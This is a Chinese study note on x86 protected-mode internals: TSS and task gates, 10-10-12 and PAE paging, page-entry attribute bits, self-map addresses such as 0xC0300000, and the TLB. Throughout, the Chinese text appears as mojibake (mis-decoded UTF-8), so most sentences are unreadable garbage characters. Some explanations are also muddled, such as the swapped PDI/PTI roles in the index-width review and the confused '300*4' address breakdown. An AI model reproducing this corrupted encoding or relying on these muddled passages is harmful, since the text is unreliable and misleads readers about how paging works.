çš„ä½œç”¨\nIntelçš„è®¾è®¡TSSç›®çš„ï¼Œç”¨å®˜æ–¹çš„è¯è¯´å°±æ˜¯å®ç°æ‰€è°“çš„ä»»åŠ¡åˆ‡æ¢ã€‚CPUçš„ä»»åŠ¡åœ¨æ“ä½œç³»ç»Ÿçš„æ–¹é¢å°±æ˜¯çº¿ç¨‹ã€‚ä»»åŠ¡ä¸€åˆ‡æ¢ï¼Œæ‰§è¡Œéœ€è¦çš„ç¯å¢ƒå°±å˜äº†ï¼Œå³æ‰€æœ‰å¯„å­˜å™¨é‡Œé¢çš„å€¼ï¼Œéœ€è¦ä¿å­˜ä¾›ä¸‹ä¸€æ¬¡åˆ‡æ¢åˆ°è¯¥ä»»åŠ¡çš„æ—¶å€™å†æ¢å›å»é‡æ–°æ‰§è¡Œã€‚ è¯´åˆ°åº•ï¼ŒTSSçš„æ„ä¹‰å°±åœ¨äºå¯ä»¥åŒæ—¶æ¢æ‰ä¸€å †å¯„å­˜å™¨ã€‚æœ¬è´¨ä¸Šå’Œæ‰€è°“çš„ä»»åŠ¡åˆ‡æ¢æ²¡å•¥æ ¹æœ¬è”ç³»ã€‚è€Œæ“ä½œç³»ç»Ÿå«Œå¼ƒIntelçš„è®¾è®¡è¿‡äºéº»çƒ¦ï¼Œè‡ªå·±å®ç°äº†æ‰€è°“çš„ä»»åŠ¡åˆ‡æ¢ï¼Œå³çº¿ç¨‹åˆ‡æ¢ã€‚(åº”è¯¥æœ‰ç‚¹åƒsropçš„æ„Ÿè§‰å§)\nCPU å¦‚ä½•æ‰¾åˆ° TSS\nTSSæ˜¯ä¸€ä¸ªå†…å­˜å—ï¼Œå¹¶ä¸åœ¨CPUä¸­ï¼Œé‚£ä¹ˆå®ƒæ˜¯æ€æ ·æ‰¾åˆ°æ­£ç¡®çš„TSSå‘¢ï¼Ÿé‚£å°±æ˜¯ä¹‹å‰æåˆ°çš„TRæ®µå¯„å­˜å™¨ï¼Œè€ŒTRå¯„å­˜å™¨é‡Œé¢çš„å€¼æ˜¯ä»æ®µæè¿°ç¬¦é‡Œé¢åŠ è½½çš„ï¼Œä¹Ÿå°±æ˜¯ä»GDTè¡¨é‡Œé¢çš„TSSæ®µæè¿°ç¬¦åŠ è½½çš„ã€‚CPUé€šè¿‡TRå¯„å­˜å™¨ç´¢å¼•TSSæ˜¯ç¤ºæ„å›¾å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nTSSæ®µæè¿°ç¬¦\nTSSæ®µæè¿°ç¬¦çš„ç»“æ„å’Œæ™®é€šçš„æ®µæè¿°ç¬¦æ²¡å•¥åŒºåˆ«ï¼Œå°±æ˜¯ç³»ç»Ÿæ®µæè¿°ç¬¦ï¼Œå¦‚æœTypeä¸º9(B=0 1001)ï¼Œåˆ™è¿™ä¸ªTSSæ®µæè¿°ç¬¦æ²¡æœ‰åŠ è½½åˆ°TRå¯„å­˜å™¨ä¸­ï¼Œå¦‚æœTypeä¸ºB(B=1 1011)ï¼Œå°±æ˜¯åŠ è½½äº†ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nTRå¯„å­˜å™¨è¯»å†™\nåŠ è½½TSS æŒ‡ä»¤ï¼šLTR è¯´æ˜ï¼šç”¨LTRæŒ‡ä»¤å»è£…è½½ï¼Œä»…ä»…æ˜¯æ”¹å˜TRå¯„å­˜å™¨çš„å€¼ï¼ˆ96ä½ï¼‰ï¼Œå¹¶æ²¡æœ‰çœŸæ­£æ”¹å˜TSSã€‚LTRæŒ‡ä»¤åªèƒ½åœ¨ç³»ç»Ÿå±‚ä½¿ç”¨ï¼ŒåŠ è½½åTSSæ®µæè¿°ç¬¦ä¼šçŠ¶æ€ä½ä¼šå‘ç”Ÿæ”¹å˜ã€‚ è¯»å–TRå¯„å­˜å™¨ æŒ‡ä»¤ï¼šSTR è¯´æ˜ï¼šå¦‚æœç”¨STRå»è¯»çš„è¯ï¼Œåªè¯»äº†TRçš„16ä½ï¼Œå³é€‰æ‹©å­ã€‚ ä¿®æ”¹TRå¯„å­˜å™¨é€”å¾„\nåœ¨0ç¯å¯ä»¥é€šè¿‡LTRæŒ‡ä»¤å»ä¿®æ”¹TRå¯„å­˜å™¨ã€‚ åœ¨3ç¯å¯ä»¥é€šè¿‡CALL FARæˆ–è€…JMP FARæŒ‡ä»¤æ¥ä¿®æ”¹ã€‚ç”¨JMPå»è®¿é—®ä¸€ä¸ªä»»åŠ¡æ®µçš„æ—¶å€™ï¼Œå¦‚æœæ˜¯TSSæ®µæè¿°ç¬¦ï¼Œå…ˆä¿®æ”¹TRå¯„å­˜å™¨ï¼Œåœ¨ç”¨TR.BaseæŒ‡å‘çš„TSSä¸­çš„å€¼ä¿®æ”¹å½“å‰çš„å¯„å­˜å™¨ã€‚ ä»»åŠ¡é—¨ IDT ä¸­æ–­æè¿°ç¬¦è¡¨:\nIDTè¡¨å¯ä»¥åŒ…å«3ç§é—¨æè¿°ç¬¦ï¼šä»»åŠ¡é—¨æè¿°ç¬¦\tä¸­æ–­é—¨æè¿°ç¬¦\té™·é˜±é—¨æè¿°ç¬¦\nä»»åŠ¡é—¨ç»“æ„:\næ‰§è¡Œè¿‡ç¨‹ï¼š\né€šè¿‡INT Nçš„æŒ‡ä»¤è¿›è¡Œè§¦å‘ä»»åŠ¡é—¨ æŸ¥IDTè¡¨ï¼Œæ‰¾åˆ°ä»»åŠ¡é—¨æè¿°ç¬¦ é€šè¿‡ä»»åŠ¡é—¨æè¿°ç¬¦ï¼ŒæŸ¥GDTè¡¨ï¼Œæ‰¾åˆ°TSSæ®µæè¿°ç¬¦ ä½¿ç”¨TSSæ®µä¸­çš„å€¼ä¿®æ”¹TRå¯„å­˜å™¨ IRETDè¿”å› 10-10-12åˆ†é¡µ è™šæ‹Ÿåœ°å€ç©ºé—´æ˜¯ä»€ä¹ˆï¼Ÿ\næ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªâ€œå‡æƒ³çš„â€å†…å­˜ç©ºé—´ï¼Œå¤§å°æ˜¯4GBã€‚è¿™å¹¶ä¸æ˜¯è¯´æ¯ä¸ªè¿›ç¨‹éƒ½çœŸçš„å ç”¨äº†4GBçš„å†…å­˜ï¼Œè€Œæ˜¯æ“ä½œç³»ç»Ÿä¸ºæ¯ä¸ªè¿›ç¨‹æä¾›äº†ä¸€ä¸ªè¿™æ ·çš„â€œåœ°å€åœ°å›¾â€ã€‚å¯ä»¥æŠŠå®ƒçœ‹ä½œæ˜¯ä¸€ä¸ªå·¨å¤§çš„å›¾ä¹¦é¦†ç›®å½•ï¼Œè¿™ä¸ªç›®å½•å‘Šè¯‰è¿›ç¨‹å¯ä»¥åœ¨è¿™äº›åœ°å€ä¸Šâ€œå­˜æ”¾â€æ•°æ®ã€‚\nè¿™äº›è™šæ‹Ÿåœ°å€å°±åƒåœ°å›¾ä¸Šçš„æ ‡è®°ï¼Œå®ƒä»¬å¹¶ä¸ç›´æ¥å¯¹åº”è®¡ç®—æœºç¡¬ä»¶ä¸­çš„å®é™…å†…å­˜ä½ç½®ã€‚å®é™…çš„ç‰©ç†å†…å­˜åœ°å€æ˜¯è®¡ç®—æœºçœŸæ­£ç”¨æ¥å­˜å‚¨æ•°æ®çš„åœ°æ–¹ã€‚å¯ä»¥æŠŠç‰©ç†åœ°å€æƒ³è±¡æˆå›¾ä¹¦é¦†ä¸­çš„å®é™…ä¹¦æ¶ä½ç½®ã€‚\nä¸€ä¸ªè¿›ç¨‹éƒ½æœ‰4GBçš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œå®ƒä»¬å¹¶ä¸æ˜¯çœŸæ­£çš„åœ°å€ï¼Œè€Œæ˜¯ä¸ªç´¢å¼•ã€‚å®ƒé€šè¿‡æŸç§æ–¹å¼è¿›è¡Œè½¬æ¢ï¼Œä»è€ŒæŒ‡å‘çœŸæ­£çš„ç‰©ç†åœ°å€ï¼š\nå¦‚ä¸‹æŒ‡ä»¤ï¼š\nMOV eax,dword ptr ds:[0x12345678]\nå…¶ä¸­ï¼Œ0x12345678 æ˜¯æœ‰æ•ˆåœ°å€ï¼Œds.Base + 0x12345678æ˜¯çº¿æ€§åœ°å€\nè§£é‡Šï¼šè¿™ä¸ªçº¿æ€§åœ°å€å®é™…ä¸Šæ˜¯ä¸å­˜åœ¨çš„ï¼Œåœ¨æ‰§è¡Œæ—¶CPUä¼šå°†çº¿æ€§åœ°å€è½¬åŒ–ä¸ºç‰©ç†åœ°å€\n10-10-12æ‹†åˆ†ï¼šå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª32ä½çš„è™šæ‹Ÿåœ°å€ã€‚10-10-12æ‹†åˆ†æ˜¯æŠŠè¿™ä¸ª32ä½çš„åœ°å€åˆ†æˆä¸‰ä¸ªéƒ¨åˆ†ï¼Œå‰10ä½ä¸­é—´10ä½å’Œå12ä½\nCPUå¾—åˆ°çº¿æ€§åœ°å€ä¹‹åç»è¿‡10-10-12æ‹†åˆ†æˆä¸‰ä»½å»æ‰¾ç‰©ç†åœ°å€ï¼ŒCPUä¼šå»æ‰¾CR3å¯„å­˜å™¨ï¼ŒCR3å¯„å­˜å™¨é‡Œé¢å­˜çš„åœ°å€æŒ‡å‘ä¸€ä¸ª4kbçš„é¡µè¿™å°±æ˜¯å®ƒçš„ç¬¬ä¸€çº§ï¼Œæ‹†åˆ†çš„ç¬¬ä¸€ä¸ª10ä½å†³å®šäº†åœ¨ç¬¬ä¸€çº§ä¸­çš„ä»€ä¹ˆä½ç½®ï¼›è¿™ä¸ªä½ç½®é‡Œé¢çš„å€¼åˆæŒ‡å‘ä¸€ä¸ª4kbçš„é¡µè¿™å°±æ˜¯å®ƒçš„ç¬¬äºŒçº§ï¼Œæ‹†åˆ†çš„ç¬¬äºŒä¸ª10ä½å†³å®šäº†åœ¨ç¬¬äºŒçº§ä¸­çš„ä»€ä¹ˆä½ç½®ï¼Œè€Œç¬¬ä¸‰ä¸ª12ä½å†³å®šäº†åœ¨ç‰©ç†é¡µä¸­çš„ä»€ä¹ˆä½ç½®ã€‚\næ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªCR3ï¼Œå‡†ç¡®çš„è¯´æ˜¯éƒ½ä¸€ä¸ªCR3çš„å€¼ã€‚CR3æœ¬èº«æ˜¯ä¸ªå¯„å­˜å™¨ï¼Œä¸€æ ¸ä¸€å¥—å¯„å­˜å™¨ã€‚CR3é‡Œé¢æ”¾çš„æ˜¯ä¸€ä¸ªçœŸæ­£çš„ç‰©ç†åœ°å€ï¼ŒæŒ‡å‘ä¸€ä¸ªç‰©ç†é¡µï¼Œä¸€å…±4096å­—èŠ‚ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nå¯¹äº10-10-12åˆ†é¡µæ¥è¯´ï¼Œçº¿æ€§åœ°å€å¯¹åº”çš„ç‰©ç†åœ°å€æ˜¯æœ‰å¯¹åº”å…³ç³»çš„ï¼Œå®ƒè¢«åˆ†æˆäº†ä¸‰ä¸ªéƒ¨åˆ†ï¼Œæ¯ä¸ªéƒ¨åˆ†éƒ½æœ‰å®ƒå…·ä½“çš„å«ä¹‰ã€‚çº¿æ€§åœ°å€åˆ†é…çš„ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nç¬¬ä¸€ä¸ªéƒ¨åˆ†æŒ‡çš„æ˜¯PDEåœ¨PDTçš„ç´¢å¼•ï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯PTEåœ¨PTTçš„ç´¢å¼•ï¼Œç¬¬ä¸‰ä¸ªéƒ¨åˆ†æ˜¯åœ¨PTEæŒ‡å‘çš„ç‰©ç†é¡µçš„åç§»ã€‚PDTè¢«ç§°ä¸ºé¡µç›®å½•è¡¨ï¼ŒPTTè¢«ç§°ä¸ºé¡µè¡¨ã€‚PDEå’ŒPTEåˆ†åˆ«æ˜¯å®ƒä»¬çš„æˆå‘˜ï¼Œå¤§å°ä¸º4ä¸ªå­—èŠ‚ã€‚æ¥ä¸‹æ¥å°†è¯¦ç»†ä»‹ç»æ¯ä¸€ä¸ªéƒ¨åˆ†æ˜¯å’‹ç”¨çš„ã€‚\nPDEä¸PTE åˆ†é¡µå¹¶ä¸æ˜¯ç”±æ“ä½œç³»ç»Ÿå†³å®šçš„ï¼Œè€Œæ˜¯ç”±CPUå†³å®šçš„ã€‚åªæ˜¯æ“ä½œç³»ç»Ÿéµå®ˆäº†CPUçš„çº¦å®šæ¥å®ç°çš„ã€‚ç‰©ç†é¡µæ˜¯ä»€ä¹ˆï¼Ÿç‰©ç†é¡µæ˜¯æ“ä½œç³»ç»Ÿå¯¹å¯ç”¨çš„ç‰©ç†å†…å­˜çš„æŠ½è±¡ï¼ŒæŒ‰ç…§4KBçš„å¤§å°è¿›è¡Œç®¡ç†ï¼ˆIntelæ˜¯æŒ‰ç…§è¿™ä¸ªå€¼åšçš„ï¼Œåˆ«çš„CPUå°±ä¸æ¸…æ¥šäº†ï¼‰ï¼Œå’ŒçœŸå®ç¡¬ä»¶å±‚é¢ä¸Šçš„å†…å­˜æœ‰ä¸€å±‚çš„æ˜ å°„å…³ç³»ï¼Œè¿™ä¸ªä¸æ˜¯ä¿æŠ¤æ¨¡å¼çš„èŒƒç•´ï¼Œæ•…ä¸ä»‹ç»ã€‚\nPDEä¸PTEå±æ€§ ç‰©ç†é¡µçš„å±æ€§ = PDEå±æ€§ \u0026 PTEå±æ€§\n9~12ä½ï¼ˆç¼ºé¡µå¼‚å¸¸ï¼‰\nå†…å­˜ç´§å¼ æ—¶ï¼Œå½“CPUå‘ç°æŸä¸€çº¿æ€§åœ°å€è®¿é—®é¢‘ç‡ä¸æ˜¯ç‰¹åˆ«é«˜æ—¶ï¼Œæ“ä½œç³»ç»Ÿå°±ä¼šæŠŠè¿™ä¸ªåœ°å€çš„å†…å®¹å­˜åˆ°æ–‡ä»¶é‡Œé¢ï¼Œå¹¶ä¸”å°†Pä½ç½®0ã€‚ å½“CPUè®¿é—®ä¸€ä¸ªåœ°å€ï¼Œå¦‚æœå…¶PTEçš„Pä½ä¸º0ï¼Œæ­¤æ—¶ä¼šäº§ç”Ÿç¼ºé¡µå¼‚å¸¸ã€‚ï¼ˆæ­¤æ—¶èµ°eå·ä¸­æ–­ï¼‰ Gä½\nâ€‹\tå¦‚æœGä½ä¸º1åˆ·æ–°TLBæ—¶å°†ä¸ä¼šåˆ·æ–°PDE/PTEçš„Gä½ä¸º1çš„é¡µï¼ŒG=1åˆ‡æ¢è¿›ç¨‹è¯¥PTEæ‰”ç„¶æœ‰æ•ˆ(è¿™é‡Œå­¦å®ŒTLBæ‰èƒ½æ˜ç™½)\n(PDE)PSä½\nè¿™ä¸ªä½åªå¯¹PDEæœ‰æ„ä¹‰ã€‚å¦‚æœPS == 1ï¼Œåˆ™PDEç›´æ¥æŒ‡å‘ç‰©ç†é¡µï¼ˆé«˜20ä½å°±æ˜¯ç‰©ç†é¡µï¼‰ï¼Œä¸å†æŒ‡å‘PTEï¼Œ10-10-12çš„ä½22ä½æ˜¯é¡µå†…åç§»ã€‚å®ƒçš„å¤§å°ä¸º4MBï¼Œä¿—ç§°â€œå¤§é¡µâ€ã€‚\n(PTE)D ä½\nè„ä½ï¼ŒæŒ‡ç¤ºæ˜¯å¦è¢«å†™è¿‡ã€‚è‹¥æ²¡æœ‰è¢«å†™è¿‡ä¸º0ï¼Œè¢«å†™è¿‡ä¸º1ã€‚\nA ä½\næ˜¯å¦è¢«è®¿é—®ï¼Œå³æ˜¯å¦è¢«è¯»æˆ–è€…å†™è¿‡ï¼Œå¦‚æœè¢«è®¿é—®è¿‡åˆ™ç½®1ã€‚å³ä½¿è®¿é—®äº†ä¸€å­—èŠ‚ä¹Ÿæ˜¯1ã€‚\nR/W ä½\nå¦‚æœR/W = 0ï¼Œè¡¨ç¤ºæ˜¯åªè¯»çš„ï¼Œåä¹‹ä¸ºå¯è¯»å¯å†™ã€‚\nU/S ä½\nå¦‚æœU/S = 0ï¼Œåˆ™ä¸ºç‰¹æƒç”¨æˆ·ï¼ˆsuper userï¼‰ï¼Œå³é3ç¯æƒé™ã€‚åä¹‹ï¼Œåˆ™ä¸ºæ™®é€šç”¨æˆ·ï¼Œå³ä¸º3ç¯æƒé™ã€‚\nP ä½\nè¡¨ç¤ºPDEæˆ–è€…PTEæ˜¯å¦æœ‰æ•ˆï¼Œå¦‚æœæœ‰æ•ˆä¸º1ï¼Œåä¹‹ä¸º0ã€‚\né¡µç›®å½•è¡¨åŸºå€ å¦‚æœç³»ç»Ÿè¦ä¿è¯æŸä¸ªçº¿æ€§åœ°å€æ˜¯æœ‰æ•ˆçš„ï¼Œå¿…é¡»ä¸ºå…¶å¡«å……æ­£ç¡®çš„PDEä¸PTEï¼Œå¦‚æœæˆ‘ä»¬æƒ³å¡«å……PDEä¸PTEé‚£ä¹ˆå¿…é¡»èƒ½å¤Ÿè®¿é—®ã€‚æœ‰çš„äººä¼šæƒ³ï¼Œç›´æ¥æ‹¿CR3å»å¡«å†™å°±è¡Œäº†ï¼Œè¿˜éœ€è¦é¡µç›®å½•è¡¨åŸºå€å¹²å˜›ï¼Ÿæ“ä½œç³»ç»Ÿåªèƒ½ç”¨çº¿æ€§åœ°å€ï¼Œä¸èƒ½ç”¨ç‰©ç†åœ°å€ã€‚CR3å­˜å‚¨çš„æ˜¯ç‰©ç†åœ°å€ï¼Œè¿™ä¸ªæ˜¯ç»™CPUçœ‹çš„ï¼Œä¸æ˜¯ç»™æ“ä½œç³»ç»Ÿçœ‹çš„ã€‚æ“ä½œç³»ç»Ÿè®¿é—®å®ƒå°±å¿…é¡»çŸ¥é“å®ƒçš„çº¿æ€§åœ°å€æ‰è¡Œã€‚CPUå¯ä¸å¸®æˆ‘ä»¬æŒ‚ç‰©ç†é¡µï¼Œå®ƒåšä¸åˆ°è¿™ç‚¹ï¼Œåªèƒ½æä¾›è¦æ±‚æ ‡å‡†ï¼Œè€Œæ“ä½œç³»ç»ŸæŒ‰ç…§æ ‡å‡†è¿›è¡ŒåŠäº‹ã€‚äºæ˜¯ä¹é¡µç›®å½•è¡¨åŸºå€ä¸é¡µè¡¨åŸºå€è¿™ä¸¤ä¸ªä¸œè¥¿å°±å‡ºç°äº†ã€‚\né€šè¿‡é¡µç›®å½•è¡¨åŸºå€ï¼Œæ“ä½œç³»ç»Ÿå¯ä»¥å¸®æˆ‘ä»¬ç¨‹åºæŒ‚ä¸Šæ­£ç¡®çš„PDEï¼Œé€šè¿‡é¡µè¡¨åŸºå€æŒ‚ä¸Šæ­£ç¡®çš„PTEï¼Œç„¶åæŒ‡å‘æ­£ç¡®çš„ç‰©ç†é¡µã€‚\né€šè¿‡0xC0300000æ‰¾åˆ°çš„ç‰©ç†é¡µå°±æ˜¯é¡µç›®å½•è¡¨ï¼Œè¿™ä¸ªç‰©ç†é¡µå³æ˜¯é¡µç›®å½•è¡¨æœ¬èº«ä¹Ÿæ˜¯é¡µè¡¨ é¡µç›®å½•è¡¨æ˜¯ä¸€å¼ ç‰¹æ®Šçš„é¡µè¡¨ï¼Œæ¯ä¸€é¡¹PTEæŒ‡å‘çš„ä¸æ˜¯æ™®é€šçš„ç‰©ç†é¡µï¼Œè€Œæ˜¯æŒ‡å‘å…¶ä»–çš„é¡µè¡¨ ç»“è®ºï¼š0xC0300000å­˜å‚¨çš„å€¼å°±æ˜¯PDTï¼Œå¦‚æœæˆ‘ä»¬è¦è®¿é—®ç¬¬Nä¸ªPDEï¼Œé‚£ä¹ˆæœ‰å¦‚ä¸‹å…¬å¼:0xC0300000 +N*4 0xC0300000 1100 0000 00|11 0000 0000 000 1ï¼š1100 0000 00 == 300*4 2ï¼š1100 0000 00 == 300*4 3ï¼š0 é¡µè¡¨åŸºå€ ä»…ä»…çŸ¥é“é¡µç›®å½•è¡¨åŸºå€åªèƒ½è®¿é—®ä¸€ä¸ªçº¿æ€§åœ°å€çš„PDEã€‚ä½†æ˜¯PTEæˆ‘ä»¬æ²¡åŠæ³•çŸ¥é“ï¼ˆå› ä¸ºå¦‚æœç¨‹åºä½¿ç”¨é¡µç›®å½•è¡¨åŸºå€æ˜¯æ²¡åŠæ³•è®¿PTEçš„ï¼‰ã€‚ä¸é¡µç›®å½•è¡¨åŸºå€ç±»ä¼¼ï¼Œé€šè¿‡é¡µè¡¨åŸºå€å°±å¯ä»¥è®¿é—®PTTï¼Œä¹Ÿå°±æ˜¯åœ°å€0xC0000000ã€‚\né¡µè¡¨è¢«æ˜ å°„åˆ°äº†ä»0xC0000000åˆ°0xC03FFFFFçš„4Måœ°å€ç©ºé—´ åœ¨è¿™1024ä¸ªè¡¨ä¸­æœ‰ä¸€å¼ ç‰¹æ®Šçš„è¡¨ï¼šé¡µç›®å½•è¡¨ é¡µç›®å½•è¢«æ˜ å°„åˆ°äº†0xC0300000å¼€å§‹å¤„çš„4Kåœ°å€ç©ºé—´ PDIä¸PTI\nå› ä¸ºPDEæ˜¯é¡µç›®å½•è¡¨é¡¹ï¼ŒPTEæ˜¯é¡µè¡¨é¡¹ã€‚é‚£ä¹ˆPDIå°±æ˜¯é¡µç›®å½•è¡¨ç´¢å¼•ï¼Œè€ŒPTIå°±æ˜¯é¡µè¡¨ç´¢å¼•ï¼ˆIndexï¼‰ã€‚åœ¨æˆ‘ä»¬çš„10-10-12åˆ†é¡µä¸­ï¼Œç¬¬ä¸€ä¸ª10å°±æ˜¯PDIï¼Œç¬¬äºŒä¸ª10å°±æ˜¯PTIï¼Œ12å°±æ˜¯ç‰©ç†é¡µçš„é¡µå†…åç§»ã€‚\nè®¿é—®é¡µç›®å½•è¡¨çš„å…¬å¼ï¼š0xC0300000 + PDI * 4 è®¿é—®é¡µè¡¨çš„å…¬å¼ï¼š0xC0000000 + PDI * 4096 + PTI * 4ï¼ˆå°±æ˜¯æŒ¨ä¸ªå·®ä¸€ä¸ªé¡µ0x1000ï¼‰ !vtop Cr3 çº¿æ€§åœ°å€ é€šè¿‡è¿™ä¸ªæŒ‡ä»¤å¯ä»¥ç›´æ¥å¾—åˆ°PDEå’ŒPTEğŸ˜Š 2-9-9-12åˆ†é¡µï¼ˆPAEåˆ†é¡µï¼‰ å…ˆå›é¡¾ä¸€ä¸‹10-10-12åˆ†é¡µï¼š\nä¸ºä»€ä¹ˆæ˜¯12ï¼šå› ä¸ºæœ€åè¦æ‰¾çš„ç‰©ç†é¡µå¤§å°ä¸º4kbï¼Œæ‰€ä»¥éœ€è¦2^12æ¥è¦†ç›–æ‰€æœ‰çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„é¡µå†…åç§»ã€‚ PTTé‡Œé¢çš„PTEæŒ‡å‘ç‰©ç†é¡µï¼ŒPTEä¸€å…±æœ‰1024ä¸ªæ‰€ä»¥éœ€è¦2^10æ¥æ‰¾å…¨1024ä¸ªæˆå‘˜ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„PDIã€‚ PDTé‡Œé¢çš„PDEæŒ‡å‘PTTï¼Œä¸PTEç±»ä¼¼ï¼Œæ‰€ä»¥ä¹Ÿéœ€è¦2^10æ¥æ‰¾å…¨1024ä¸ªæˆå‘˜ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„PTIã€‚ é€šè¿‡ä»¥ä¸Šï¼ŒCPUé€šè¿‡10-10-12åˆ†é¡µå¯ä»¥æ‰¾åˆ°çš„å†…å­˜ä¸€å…±æœ‰4GBï¼Œè¿™ä¸ªé€šè¿‡CPUè¯†åˆ«çš„å†…å­˜å¯ä¸æ˜¯é€šè¿‡ä¸Šé¢çš„è¡¨ä¹˜èµ·æ¥çš„ï¼Œæ˜¯å› ä¸ºä¸€ä¸ªå†…å­˜åœ°å€æœ€å¤šåªæœ‰32ä½ï¼Œæ‰€ä»¥å¯ä»¥æ‰¾åˆ°çš„å†…å­˜ä¸º2^32 = 4GBã€‚ ä¸ºä»€ä¹ˆè¦æœ‰2-9-9-12åˆ†é¡µï¼Œå…¶å®è¿˜æ˜¯ç‰©ç†é¡µä¸å¤Ÿç”¨äº†ï¼Œéœ€è¦æ‰©å±•ã€‚ä¸»è¦å°±æ˜¯å°†åœ°å€çš„é•¿åº¦å˜é•¿äº†ï¼Œç‰©ç†åœ°å€ç”±32ä½æ”¹ä¸ºäº†36ä½ã€‚é‚£ä¹ˆPDEä¸PTEä¹Ÿè¦å°†baseå¢åŠ 4ä½ï¼Œ4å­—èŠ‚å¯¹é½ä¹‹åå°±æ˜¯8å­—èŠ‚ã€‚å¯¹PTTæ¥è¯´æˆå‘˜æ•°é‡ä»1024ä¸ªå˜ä¸ºäº†512ä¸ªï¼Œæ‰€ä»¥éœ€è¦2^9æ¥ç´¢å¼•ï¼›ä¸PDTä¸€æ ·ï¼Œæ‰€ä»¥ä¹Ÿéœ€è¦2^9æ¥ç´¢å¼•ã€‚è¿™å°±æ˜¯ä¸¤ä¸ª9çš„æ¥æºã€‚é€šè¿‡ä¹‹å‰çš„æ”¹å˜åº”è¯¥å¯ä»¥ç®—å‡ºæ¥ä¸€ä¸ªPDTå°±ä»£è¡¨èƒ½å¤Ÿç´¢å¼•1GBçš„å†…å­˜ï¼Œæ‰€ä»¥åœ¨å‰é¢åˆæœ‰å«PDPTEçš„ç»“æ„æ¥æŒ‡å‘PDTï¼Œè¿™ä¸ªPDPTEç»“æ„æœ‰8ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è¿™ä¸ªç»“æ„ä¸€å…±æœ‰4ä¸ªã€‚è¿™å°±æ˜¯2çš„æ¥æºã€‚è¿™æ ·å°±å¯ä»¥ç´¢å¼•ä¸€ä¸ª4GBçš„å†…å­˜å•¦ï¼\nPDPTTç»“æ„ï¼š\nPDPTEå…±æœ‰å››é¡¹ï¼ˆç¬¬ä¸€ä¸ª2ï¼‰ 35~12å­˜å‚¨çš„æ˜¯é¡µç›®å½•è¡¨çš„åŸºå€ï¼Œä½12ä½è¡¥0ï¼Œå…±36ä½ï¼Œå³é¡µç›®å½•åŸºå€ã€‚ å…¶ä¸­ï¼ŒAvaliä½æ˜¯ç»™æ“ä½œç³»ç»Ÿä½¿ç”¨çš„ã€‚ PDEç»“æ„ï¼š\nâ†‘æ˜¯ä¸€èˆ¬é¡µ\nâ†‘æ˜¯å¤§é¡µ\næ³¨æ„ï¼š\nå½“PS=1æ—¶æ˜¯å¤§é¡µï¼Œ 35-21ä½æ˜¯å¤§é¡µçš„ç‰©ç†åœ°å€ï¼Œè¿™æ ·36ä½çš„ç‰©ç†åœ°å€çš„ä½21ä½ä¸º0ï¼Œè¿™å°±æ„å‘³ç€é¡µçš„å¤§å°ä¸º2MBï¼Œä¸”éƒ½æ˜¯2MBå¯¹é½ã€‚ å½“PS=0æ—¶ï¼Œ35-12ä½æ˜¯é¡µè¡¨åŸºå€ï¼Œä½12ä½è¡¥0ï¼Œå…±36ä½ã€‚ PTEç»“æ„ï¼š\næ³¨æ„ï¼š\nPTEä¸­35-12æ˜¯ç‰©ç†é¡µåŸºå€ï¼Œ24ä½ï¼Œä½12ä½è¡¥0\nç‰©ç†é¡µåŸºå€+12ä½çš„é¡µå†…åç§»æŒ‡å‘å…·ä½“æ•°æ®\nXDä½ï¼š\nå®ƒæ˜¯ä¸€ä¸ªä½ï¼Œå¤„äºPDEå’ŒPTEçš„æœ€é«˜ä½ã€‚å…¶å®å°±æ˜¯linuxä¿æŠ¤æœºåˆ¶é‡Œé¢çš„NX(ç¦æ­¢æ‰§è¡Œ)ï¼ŒNXæ˜¯æ ˆä¸Šçš„å†…å®¹ä¸å¯æ‰§è¡Œï¼›è€ŒXDæ˜¯æ•°æ®åŒºä¸å¯æ‰§è¡Œï¼Œå¦‚æœæœ€é«˜ä½æ˜¯1ï¼Œè¯´æ˜è¢«ä¿æŠ¤ã€‚å¦‚æœè¿™ä¸ªæ˜¯æ•°æ®åŒºï¼Œä¸”è¿™ä¸ªXä½è¢«ç½®ä¸º1ï¼Œåˆ™ä¼šè¢«æŠ¥å‡ºå¼‚å¸¸ä¸èƒ½æ‰§è¡Œã€‚\nå…¬å¼æ€»ç»“ï¼š\n2(PDPTI)-9(PDI)-9(PTI)-12(OFFSET) pPDE = 0xc0600000 + (PDPTI*4KB) + (PDI*8) pPTE = 0xc0000000 + (PDPTI*2MB) + (PDI*4KB) + (PTI*8) é’ˆå¯¹MmIsAddressValidçš„å…¬å¼å¦‚ä¸‹ï¼š\npPDE = (int*)(0xc0600000 + ((addr \u003e\u003e 18) \u0026 0x3ff8)) pPTE = (int*)(0xc0000000 + ((addr \u003e\u003e 9) \u0026 0x7ffff8)) TLB TLB(Translation Lookaside Buffer)å…¶å®å°±æ˜¯å®ç°äº†ä¸€ä¸ªç‰©ç†åœ°å€å¯¹çº¿æ€§åœ°å€çš„æ˜ å°„å…³ç³»ï¼Œæä¾›ç¼“å­˜æé«˜è¯»å†™æ•ˆç‡ã€‚\nç»“æ„å¦‚ä¸‹ï¼š\nLAï¼ˆçº¿æ€§åœ°å€ï¼‰ PAï¼ˆç‰©ç†åœ°å€ï¼‰ ATTRï¼ˆå±æ€§ï¼‰ LRUï¼ˆç»Ÿè®¡ï¼‰ 0x81010111 â€¦â€¦ â€¦â€¦ 1 å…¶ä¸­ï¼š\nATTRï¼ˆå±æ€§ï¼‰ï¼šå¦‚æœæ˜¯2-9-9-12åˆ†é¡µï¼Œå±æ€§æ˜¯PDPEã€PDEã€PTEä¸‰ä¸ªå±æ€§ç›¸**\u0026\u0026ã€‚å¦‚æœæ˜¯10-10-12åˆ†é¡µå°±æ˜¯PDEå’ŒPTEä¸¤ä¸ªå±æ€§ç›¸\u0026\u0026**ã€‚ 